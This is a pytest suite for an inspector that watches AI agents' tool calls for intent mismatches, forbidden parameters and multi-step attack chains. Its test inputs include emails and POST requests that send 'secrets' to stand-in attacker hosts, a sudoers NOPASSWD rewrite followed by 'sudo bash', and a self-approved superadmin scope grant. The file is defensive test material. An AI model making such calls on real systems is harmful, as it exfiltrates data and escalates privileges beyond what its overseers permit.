"""
Tests for modules/identity/mcp_inspector.py — MCP Intent-Aware Inspection.

Sprint 5-4: parameter validation, intent mismatch detection, chain analysis,
5 canonical attack scenarios, violation management, tool registry.
"""

from __future__ import annotations

import importlib
import os
import uuid

import pytest


# ── Fixture ───────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def isolated_db(tmp_path, monkeypatch):
    db_file = tmp_path / "test_mcp.db"
    monkeypatch.setenv("DATA_DB_PATH", str(db_file))
    import modules.identity.mcp_inspector as mi
    importlib.reload(mi)
    mi.init_db()
    yield mi


TENANT = "tenant-mcp-test"


def _session() -> str:
    return str(uuid.uuid4())


def _inspect(mi, tool_name, params=None, session_id=None,
             agent_id=None, declared_intent=None):
    return mi.inspect_call(
        tenant_id=TENANT,
        session_id=session_id or _session(),
        tool_name=tool_name,
        params=params or {},
        agent_id=agent_id,
        declared_intent=declared_intent,
    )


# ── Tool registry ─────────────────────────────────────────────────────────────

def test_builtin_tools_seeded(isolated_db):
    mi = isolated_db
    tools = mi.list_tools(tenant_id=TENANT)
    tool_names = {t["tool_name"] for t in tools}
    assert "read_file" in tool_names
    assert "write_file" in tool_names
    assert "execute_command" in tool_names
    assert "send_email" in tool_names


def test_register_custom_tool(isolated_db):
    mi = isolated_db
    tool = mi.register_tool(
        tenant_id=TENANT,
        tool_name="my_custom_tool",
        access_mode="read",
        description="Custom read-only tool",
        allowed_params=["query"],
        forbidden_params=["write"],
    )
    assert tool["tool_name"] == "my_custom_tool"
    assert tool["access_mode"] == "read"


def test_register_invalid_access_mode_raises(isolated_db):
    mi = isolated_db
    with pytest.raises(ValueError, match="access_mode must be one of"):
        mi.register_tool(
            tenant_id=TENANT,
            tool_name="bad_tool",
            access_mode="destroy",
        )


def test_get_tool_returns_builtin(isolated_db):
    mi = isolated_db
    tool = mi.get_tool(tenant_id=TENANT, tool_name="read_file")
    assert tool["access_mode"] == "read"


def test_get_unknown_tool_returns_empty(isolated_db):
    mi = isolated_db
    result = mi.get_tool(tenant_id=TENANT, tool_name="nonexistent_tool_xyz")
    assert result == {}


def test_tenant_specific_tool_overrides_builtin(isolated_db):
    mi = isolated_db
    # Override read_file to be "write" for this tenant
    mi.register_tool(
        tenant_id=TENANT,
        tool_name="read_file",
        access_mode="write",
        description="Custom override",
    )
    tool = mi.get_tool(tenant_id=TENANT, tool_name="read_file")
    assert tool["access_mode"] == "write"
    assert tool["tenant_id"] == TENANT


# ── Clean inspection (no violations) ─────────────────────────────────────────

def test_clean_read_file_allowed(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file", params={"path": "/etc/config.yaml"})
    assert result["recommendation"] == "allow"
    assert result["allowed"] is True
    assert result["risk_score"] == 0.0
    assert result["violations"] == []


def test_clean_write_file_allowed(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "write_file", params={"path": "/tmp/out.txt", "content": "hello"})
    assert result["recommendation"] == "allow"
    assert result["allowed"] is True


# ── Forbidden parameter violations ───────────────────────────────────────────

def test_forbidden_param_key_detected(isolated_db):
    mi = isolated_db
    # read_file has "write" in forbidden_params
    result = _inspect(mi, "read_file", params={"path": "/etc/file", "write": "true"})
    types = [v["type"] for v in result["violations"]]
    assert "forbidden_param" in types
    assert result["recommendation"] in ("flag", "block")


def test_forbidden_value_in_database_query(isolated_db):
    mi = isolated_db
    # database_query has DROP in forbidden_params
    result = _inspect(mi, "database_query", params={"query": "DROP TABLE users"})
    types = [v["type"] for v in result["violations"]]
    assert any(t in ("forbidden_param", "forbidden_value") for t in types)
    assert result["risk_score"] > 0


def test_forbidden_value_insert_in_query(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "database_query", params={"query": "INSERT INTO secrets VALUES (1)"})
    types = [v["type"] for v in result["violations"]]
    assert "forbidden_value" in types


# ── Intent mismatch detection ─────────────────────────────────────────────────

def test_intent_mismatch_read_vs_write(isolated_db):
    mi = isolated_db
    # Agent says "read" but calls write_file (access_mode=write)
    result = _inspect(mi, "write_file",
                      params={"path": "/etc/passwd", "content": "evil"},
                      declared_intent="read")
    types = [v["type"] for v in result["violations"]]
    assert "intent_mismatch" in types
    assert result["risk_score"] >= 0.5


def test_intent_mismatch_read_vs_exfil(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "send_email",
                      params={"to": "attacker@evil.com", "body": "secrets"},
                      declared_intent="read")
    types = [v["type"] for v in result["violations"]]
    assert "intent_mismatch" in types
    # Critical mismatch should block
    assert result["recommendation"] in ("flag", "block")


def test_matching_declared_intent_no_mismatch(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file",
                      params={"path": "/data/report.csv"},
                      declared_intent="read")
    types = [v["type"] for v in result["violations"]]
    assert "intent_mismatch" not in types


# ── Unknown tool ──────────────────────────────────────────────────────────────

def test_unknown_tool_flagged(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "mystery_tool_xyz", params={"arg": "value"})
    types = [v["type"] for v in result["violations"]]
    assert "unknown_tool" in types
    assert result["risk_score"] > 0


# ── Param constraint violations ───────────────────────────────────────────────

def test_param_constraint_max_length(isolated_db):
    mi = isolated_db
    long_path = "A" * 5000
    result = _inspect(mi, "read_file", params={"path": long_path})
    types = [v["type"] for v in result["violations"]]
    assert "param_constraint_violation" in types


def test_param_constraint_enum_invalid(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "http_request",
                      params={"url": "http://example.com", "method": "NUKE"})
    types = [v["type"] for v in result["violations"]]
    assert "param_constraint_violation" in types


def test_param_constraint_enum_valid(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "http_request",
                      params={"url": "http://example.com", "method": "GET"})
    types = [v["type"] for v in result["violations"]]
    assert "param_constraint_violation" not in types


def test_param_constraint_required_missing(isolated_db):
    mi = isolated_db
    # expand_scope requires 'approver'
    result = _inspect(mi, "expand_scope",
                      params={"agent_id": "agt-1", "scope": "admin"})
    types = [v["type"] for v in result["violations"]]
    assert "missing_required_param" in types


# ── Chain pattern detection (5 canonical attack scenarios) ───────────────────

def test_attack_read_then_exfil(isolated_db):
    """Scenario 1: read file → send_email = exfiltration pattern"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/etc/secrets"}, session_id=sid)
    result = _inspect(mi, "send_email",
                      params={"to": "outside@evil.com", "body": "data"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "read_then_exfil" in pattern_names
    assert result["risk_score"] > 0.5


def test_attack_privilege_ladder(isolated_db):
    """Scenario 2: read → write → execute = privilege escalation"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/etc/sudoers"}, session_id=sid)
    _inspect(mi, "write_file", params={"path": "/etc/sudoers", "content": "evil ALL=(ALL) NOPASSWD:ALL"}, session_id=sid)
    result = _inspect(mi, "execute_command", params={"command": "sudo bash"}, session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "privilege_ladder" in pattern_names


def test_attack_scope_creep(isolated_db):
    """Scenario 3: admin → write → execute = scope creep / policy manipulation"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "update_policy",
             params={"policy_id": "p1", "rules": {}, "actor": "agent"},
             session_id=sid)
    _inspect(mi, "write_file", params={"path": "/config/policy.json", "content": "{}"},
             session_id=sid)
    result = _inspect(mi, "execute_command", params={"command": "apply_policy"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "scope_creep" in pattern_names


def test_attack_data_staging(isolated_db):
    """Scenario 4: read → read → write = data staging for exfil"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/db/users.csv"}, session_id=sid)
    _inspect(mi, "database_query", params={"query": "SELECT * FROM orders"}, session_id=sid)
    result = _inspect(mi, "write_file",
                      params={"path": "/tmp/staged.tar.gz", "content": "binary"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "data_staging" in pattern_names


def test_attack_admin_takeover(isolated_db):
    """Scenario 5: admin → exfil = admin takeover"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "expand_scope",
             params={"agent_id": "agt-1", "scope": "superadmin", "justification": "none", "approver": "attacker"},
             session_id=sid)
    result = _inspect(mi, "http_request",
                      params={"url": "https://attacker.io/exfil", "method": "POST", "body": "secrets"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "admin_takeover" in pattern_names


# ── Chain isolation across sessions ───────────────────────────────────────────

def test_chain_patterns_isolated_per_session(isolated_db):
    """Chain patterns must not leak across different sessions."""
    mi = isolated_db
    sid_a = _session()
    sid_b = _session()
    _inspect(mi, "read_file", params={"path": "/etc/secrets"}, session_id=sid_a)
    # Send email in a DIFFERENT session — should NOT match read_then_exfil
    result = _inspect(mi, "send_email",
                      params={"to": "outside@evil.com", "body": "data"},
                      session_id=sid_b)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "read_then_exfil" not in pattern_names


# ── Violation management ──────────────────────────────────────────────────────

def test_violations_recorded(isolated_db):
    mi = isolated_db
    _inspect(mi, "read_file", params={"path": "/x", "write": "bad"})
    violations = mi.list_violations(tenant_id=TENANT)
    assert len(violations) >= 1


def test_violations_filter_unresolved(isolated_db):
    mi = isolated_db
    _inspect(mi, "read_file", params={"write": "bad"})
    unresolved = mi.list_violations(tenant_id=TENANT, resolved=False)
    assert all(not v["resolved"] for v in unresolved)


def test_resolve_violation(isolated_db):
    mi = isolated_db
    _inspect(mi, "read_file", params={"write": "bad"})
    violations = mi.list_violations(tenant_id=TENANT, resolved=False)
    assert len(violations) >= 1
    vid = violations[0]["violation_id"]
    resolved = mi.resolve_violation(
        tenant_id=TENANT, violation_id=vid, resolved_by="ops@acme.io"
    )
    assert resolved["resolved"] is True
    assert resolved["resolved_by"] == "ops@acme.io"


def test_resolve_nonexistent_raises(isolated_db):
    mi = isolated_db
    with pytest.raises(KeyError):
        mi.resolve_violation(tenant_id=TENANT, violation_id="not-real", resolved_by="x")


# ── Chain log retrieval ───────────────────────────────────────────────────────

def test_get_chain_returns_ordered_calls(isolated_db):
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/a"}, session_id=sid)
    _inspect(mi, "write_file", params={"path": "/b", "content": "x"}, session_id=sid)
    chain = mi.get_chain(tenant_id=TENANT, session_id=sid)
    assert len(chain) == 2
    assert chain[0]["tool_name"] == "read_file"
    assert chain[1]["tool_name"] == "write_file"


def test_get_chain_tenant_isolation(isolated_db):
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/a"}, session_id=sid)
    chain = mi.get_chain(tenant_id="other-tenant", session_id=sid)
    assert len(chain) == 0


# ── Risk scoring ──────────────────────────────────────────────────────────────

def test_clean_call_zero_risk(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file", params={"path": "/safe/path"})
    assert result["risk_score"] == 0.0


def test_high_severity_violation_high_risk(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file", params={"write": "bad"})
    assert result["risk_score"] >= 0.5


# ─────────────────────────────────────────────────────────────────────────────
# MCP Sprint — chain pattern subsequence matching with bounded gaps
# ─────────────────────────────────────────────────────────────────────────────


class TestChainPatternSubsequence:
    """
    The pre-MCP-sprint matcher only accepted exact-suffix sequences.  The
    new matcher allows up to CHAIN_PATTERN_MAX_GAP unrelated calls between
    pattern steps so a pattern survives mild noise injection while still
    requiring the LAST call to be the pattern's terminal step.
    """

    def test_exact_sequence_matches_with_max_confidence(self, isolated_db):
        mi = isolated_db
        ok, gap, positions = mi._find_subsequence_with_gap(
            ["read", "exfil"], ["read", "exfil"], max_gap=3
        )
        assert ok
        assert gap == 0
        assert positions == [0, 1]

    def test_subsequence_with_one_gap_matches(self, isolated_db):
        mi = isolated_db
        ok, gap, positions = mi._find_subsequence_with_gap(
            ["read", "noise", "exfil"], ["read", "exfil"], max_gap=3
        )
        assert ok
        assert gap == 1

    def test_gap_exceeded_does_not_match(self, isolated_db):
        mi = isolated_db
        # Five noise calls between read and exfil; max_gap=3 forbids it.
        ok, _, _ = mi._find_subsequence_with_gap(
            ["read", "n", "n", "n", "n", "n", "exfil"], ["read", "exfil"], max_gap=3
        )
        assert not ok

    def test_last_call_must_be_terminal_step(self, isolated_db):
        """A pattern is only "happening now" when the most recent call is the
        final pattern step.  An old chain that ended turns ago must not
        re-fire on every subsequent call."""
        mi = isolated_db
        ok, _, _ = mi._find_subsequence_with_gap(
            ["read", "exfil", "noise"], ["read", "exfil"], max_gap=3
        )
        assert not ok

    def test_empty_inputs_return_no_match(self, isolated_db):
        mi = isolated_db
        assert not mi._find_subsequence_with_gap([], ["read", "exfil"], max_gap=3)[0]
        assert not mi._find_subsequence_with_gap(["read"], [], max_gap=3)[0]

    def test_pattern_match_carries_confidence_and_positions(self, isolated_db):
        mi = isolated_db
        matches = mi._match_chain_patterns(["read", "noise", "exfil"])
        assert any(m["name"] == "read_then_exfil" for m in matches)
        m = next(m for m in matches if m["name"] == "read_then_exfil")
        assert "confidence" in m
        assert 0.0 < m["confidence"] <= 1.0
        assert m["positions"] == [0, 2]
        assert m["gap"] == 1

    def test_tighter_match_yields_higher_confidence(self, isolated_db):
        mi = isolated_db
        tight = mi._match_chain_patterns(["read", "exfil"])
        loose = mi._match_chain_patterns(["read", "n", "n", "exfil"])
        tight_conf = next(m for m in tight if m["name"] == "read_then_exfil")["confidence"]
        loose_conf = next(m for m in loose if m["name"] == "read_then_exfil")["confidence"]
        assert tight_conf > loose_conf


class TestChainPatternViaInspectCall:
    """Real-call integration: the matcher works when called through inspect_call."""

    def test_noisy_session_still_detects_read_then_exfil(self, isolated_db):
        mi = isolated_db
        sid = _session()
        # Realistic session: a read, then 2 unrelated calls, then exfil.
        _inspect(mi, "read_file", params={"path": "/etc/secrets"}, session_id=sid)
        _inspect(mi, "list_files", params={"path": "/tmp"}, session_id=sid)
        _inspect(mi, "list_files", params={"path": "/tmp"}, session_id=sid)
        result = _inspect(
            mi, "send_email",
            params={"to": "evil@elsewhere", "subject": "x", "body": "x"},
            session_id=sid,
        )
        names = [p["name"] for p in result["chain_patterns"]]
        assert "read_then_exfil" in names

    def test_exact_chain_match_has_full_confidence(self, isolated_db):
        mi = isolated_db
        sid = _session()
        _inspect(mi, "read_file", params={"path": "/etc/secrets"}, session_id=sid)
        result = _inspect(
            mi, "send_email",
            params={"to": "x@y", "subject": "x", "body": "x"},
            session_id=sid,
        )
        match = next(
            p for p in result["chain_patterns"] if p["name"] == "read_then_exfil"
        )
        assert match["confidence"] == 1.0


class TestChainPatternTimeWindow:
    """Calls outside CHAIN_PATTERN_WINDOW_SECONDS must not chain."""

    def test_old_calls_outside_window_do_not_chain(self, isolated_db):
        mi = isolated_db
        sid = _session()
        # Backdate a "read" outside the 1-hour window (default 3600s).
        from datetime import datetime, timedelta, timezone
        old_ts = (
            datetime.now(timezone.utc) - timedelta(seconds=mi.CHAIN_PATTERN_WINDOW_SECONDS + 60)
        ).isoformat()
        # Insert directly so we control the timestamp.
        with mi._cursor() as cur:
            cur.execute(
                """
                INSERT INTO mcp_call_log
                    (call_id, session_id, tenant_id, agent_id, tool_name,
                     params_json, access_mode, risk_score, recommendation,
                     violations_json, chain_patterns, created_at)
                VALUES (?, ?, ?, NULL, ?, '{}', ?, 0.0, 'allow', '[]', '[]', ?)
                """,
                (str(uuid.uuid4()), sid, TENANT, "read_file", "read", old_ts),
            )
        # Now exfil — the old read should NOT chain since it's out of window.
        result = _inspect(
            mi, "send_email",
            params={"to": "x@y", "subject": "x", "body": "x"},
            session_id=sid,
        )
        names = [p["name"] for p in result["chain_patterns"]]
        assert "read_then_exfil" not in names


# ─────────────────────────────────────────────────────────────────────────────
# Trust graph integration
# ─────────────────────────────────────────────────────────────────────────────


class TestTrustGraphIntegration:
    """
    Every inspect_call should leave an agent→tool edge in the trust_graph
    so cross-module anomaly detectors can consume MCP usage.
    """

    def test_inspect_records_agent_tool_edge(self, isolated_db, tmp_path, monkeypatch):
        mi = isolated_db
        # Reload trust_graph against the same DB so it shares storage with mi.
        import importlib
        import modules.identity.trust_graph as tg
        importlib.reload(tg)
        tg.init_db()

        sid = _session()
        _inspect(
            mi, "read_file",
            params={"path": "/etc/x"},
            session_id=sid, agent_id="agent-trustgraph-A",
        )

        # The trust_graph should now have an agent node + tool node + edge.
        nid_agent = tg._node_id(TENANT, "agent", "agent-trustgraph-A")
        nid_tool = tg._node_id(TENANT, "tool", "mcp:read_file")
        eid = tg._edge_id(TENANT, nid_agent, nid_tool, "uses_tool")
        conn = tg._get_conn()
        try:
            agent_row = conn.execute(
                "SELECT * FROM tg_nodes WHERE node_id=?", (nid_agent,)
            ).fetchone()
            tool_row = conn.execute(
                "SELECT * FROM tg_nodes WHERE node_id=?", (nid_tool,)
            ).fetchone()
            edge_row = conn.execute(
                "SELECT * FROM tg_edges WHERE edge_id=?", (eid,)
            ).fetchone()
        finally:
            conn.close()
        assert agent_row is not None
        assert tool_row is not None
        assert edge_row is not None

    def test_trust_graph_failure_does_not_block_inspection(self, isolated_db):
        """
        If trust_graph integration raises for any reason, inspect_call must
        still return successfully — graph emission is best-effort enrichment.
        """
        mi = isolated_db
        import unittest.mock as mock

        with mock.patch.object(
            mi, "_record_trust_graph_edge", side_effect=Exception("boom")
        ):
            with pytest.raises(Exception):
                # Direct helper call propagates...
                mi._record_trust_graph_edge(
                    tenant_id=TENANT, agent_id="a", tool_name="x",
                    access_mode="read",
                )
        # ...but inspect_call swallows it (the helper itself is wrapped in
        # try/except in production code).  Verify the production path:
        with mock.patch(
            "modules.identity.trust_graph._upsert_nodes",
            side_effect=Exception("graph unavailable"),
        ):
            result = _inspect(mi, "read_file", params={"path": "/x"}, agent_id="a-1")
        assert result["call_id"]
        assert "recommendation" in result


# ─────────────────────────────────────────────────────────────────────────────
# Audit emission
# ─────────────────────────────────────────────────────────────────────────────


class TestMCPAuditEmission:
    def test_inspect_emits_call_inspected(self, isolated_db):
        mi = isolated_db
        import unittest.mock as mock
        with mock.patch.object(mi, "log_event") as fake:
            _inspect(mi, "read_file", params={"path": "/x"})
        types = {c.args[0].value for c in fake.call_args_list}
        assert "mcp.call.inspected" in types

    def test_inspect_with_violation_emits_violation_detected(self, isolated_db):
        mi = isolated_db
        import unittest.mock as mock
        with mock.patch.object(mi, "log_event") as fake:
            _inspect(mi, "read_file", params={"write": "bad"})
        types = {c.args[0].value for c in fake.call_args_list}
        assert "mcp.violation.detected" in types

    def test_inspect_with_chain_pattern_emits_pattern_matched(self, isolated_db):
        mi = isolated_db
        import unittest.mock as mock
        sid = _session()
        _inspect(mi, "read_file", params={"path": "/x"}, session_id=sid)
        with mock.patch.object(mi, "log_event") as fake:
            _inspect(
                mi, "send_email",
                params={"to": "x@y", "subject": "x", "body": "x"},
                session_id=sid,
            )
        types = {c.args[0].value for c in fake.call_args_list}
        assert "mcp.chain.pattern_matched" in types

    def test_resolve_violation_emits_resolved(self, isolated_db):
        mi = isolated_db
        import unittest.mock as mock
        # Create a violation first.
        result = _inspect(mi, "read_file", params={"write": "bad"})
        violations = mi.list_violations(tenant_id=TENANT)
        assert violations, "test fixture should produce at least one violation"
        with mock.patch.object(mi, "log_event") as fake:
            mi.resolve_violation(
                tenant_id=TENANT,
                violation_id=violations[0]["violation_id"],
                resolved_by="ops@example.com",
            )
        assert fake.called
        assert fake.call_args.args[0].value == "mcp.violation.resolved"
